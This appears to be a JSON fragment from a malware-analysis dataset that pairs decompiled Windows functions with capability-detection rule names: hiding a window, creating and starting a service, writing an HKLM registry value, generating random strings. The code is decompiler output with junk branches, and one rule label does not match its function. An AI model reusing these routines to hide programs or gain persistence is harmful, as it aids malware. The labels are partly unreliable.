        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00405090) overlaps instruction at (ram,0x0040508f)\n// \n// WARNING: Removing unreachable block (ram,0x004050b2)\n\nvoid __cdecl fcn.00405070(ushort *arg_8h, char **arg_ch)\n\n{\n    uint8_t *puVar1;\n    uint8_t uVar2;\n    char **ppcVar3;\n    ushort *puVar4;\n    char cVar7;\n    int32_t in_EAX;\n    char *pcVar5;\n    int32_t iVar6;\n    uint8_t in_CL;\n    ushort *unaff_EBX;\n    char **unaff_ESI;\n    char **unaff_EDI;\n    ushort in_DS;\n    bool in_SF;\n    bool bVar8;\n    \n    if ((!in_SF) && (puVar4 = unaff_EBX,  in_SF)) goto code_r0x00405081;\n    unaff_ESI = NULL;\n    bVar8 = false;\n    ppcVar3 = arg_ch;\n    if (arg_ch != NULL) {\n        do {\n            puVar4 = arg_8h;\n            unaff_EDI = arg_ch;\n            if (bVar8 == ppcVar3 < 0) {\ncode_r0x00405081:\n                arg_8h = puVar4;\n                pcVar5 = in_EAX + 0x330c7d8b;\n                *unaff_EDI = *unaff_EDI | in_CL;\n                *arg_8h = in_DS;\n                *pcVar5 = *pcVar5 + pcVar5;\n                puVar1 = unaff_ESI + 0x52;\n                uVar2 = *puVar1;\n                cVar7 = pcVar5 >> 8;\n                *puVar1 = *puVar1 + cVar7;\n                arg_ch = unaff_EDI;\n                if (SCARRY1(uVar2, cVar7) != *puVar1 < '\\0') {\n                    out(0xc4, pcVar5);\n                    arg_ch = unaff_EDI + 1;\n                    *unaff_EDI = pcVar5;\n                }\n            }\n            iVar6 = (*_sym.imp.MSVCRT.dll_rand)();\n            in_CL = 0x1a;\n            in_EAX = iVar6 / 0x1a;\n            *(unaff_ESI + arg_8h) = iVar6 % 0x1a + 0x61;\n            unaff_ESI = unaff_ESI + 1;\n            bVar8 = SBORROW4(unaff_ESI, arg_ch);\n            ppcVar3 = unaff_ESI - arg_ch;\n        } while (unaff_ESI < arg_ch);\n    }\n    return;\n}\n",
        "token_count": 608
    },
    "004050d0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.004050d0(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.MSVCRT.dll_rand)();\n    return iVar1 % 5 + 3;\n}\n",
        "token_count": 49
    },
    "00402460": {
        "rules": [
            "hide graphical window"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00402460(uint arg_8h)\n\n{\n    uint32_t uVar1;\n    uchar *unaff_ESI;\n    bool bVar2;\n    unkbyte6 Var3;\n    \n    Var3 = (*_sym.imp.USER32.dll_CreateWindowExA)\n                     (0, 0x411560, 0x425580, 0xcf0000, 0x80000000, 0, 0x80000000, 0, 0, 0, arg_8h, 0);\n    uVar1 = Var3;\n    bVar2 = uVar1 == 0;\n    if (bVar2) {\n        return 0;\n    }\n    if ((!bVar2) && (bVar2)) {\n        uVar1 = *0x4bb148d3;\n        out(*unaff_ESI, Var3 >> 0x20);\n    }\n    (*_sym.imp.USER32.dll_ShowWindow)(uVar1, 0);\n    return 1;\n}\n",
        "token_count": 224
    },
    "004027c0": {
        "rules": [
            "get service handle",
            "start service"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004027c0(uint hSCManager, uint lpServiceName)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    bool in_CF;\n    bool in_ZF;\n    \n    if ((!in_CF && !in_ZF) && (in_CF || in_ZF)) {\n        do {\n    // WARNING: Do nothing block with infinite loop\n        } while( true );\n    }\n    iVar2 = (*_sym.imp.ADVAPI32.dll_OpenServiceA)(hSCManager, lpServiceName, 0xf01ff);\n    if (iVar2 == 0) {\n        return 0;\n    }\n    iVar3 = (*_sym.imp.ADVAPI32.dll_StartServiceA)(iVar2, 0, 0);\n    pcVar1 = _sym.imp.KERNEL32.dll_GetLastError;\n    if (((iVar3 == 0) && (iVar3 = (*_sym.imp.KERNEL32.dll_GetLastError)(),  iVar3 != 0x420)) &&\n       (iVar3 = (*pcVar1)(),  iVar3 != 0x422)) {\n        (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(iVar2);\n        return 0;\n    }\n    (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(iVar2);\n    return 1;\n}\n",
        "token_count": 291
    },
    "00403210": {
        "rules": [
            "get service handle",
            "create service"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00403210(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.ADVAPI32.dll_CreateServiceA)(arg_8h, arg_ch, arg_ch, 0xf01ff, 1, 0, 1, arg_10h, 0, 0, 0, 0, 0);\n    if (iVar1 == 0) {\n        return 0;\n    }\n    (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(iVar1);\n    return 1;\n}\n",
        "token_count": 138
    },
    "00402c80": {
        "rules": [
            "set registry value"
        ],
        "decompiled_code": "\nbool fcn.00402c80(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.SHLWAPI.dll_SHSetValueA)(0x80000002, 0x4071d8, 0x40721c, 4, &stack0x00000004, 4);\n    return iVar1 == 0;\n}\n",
        "token_count": 81
    }
}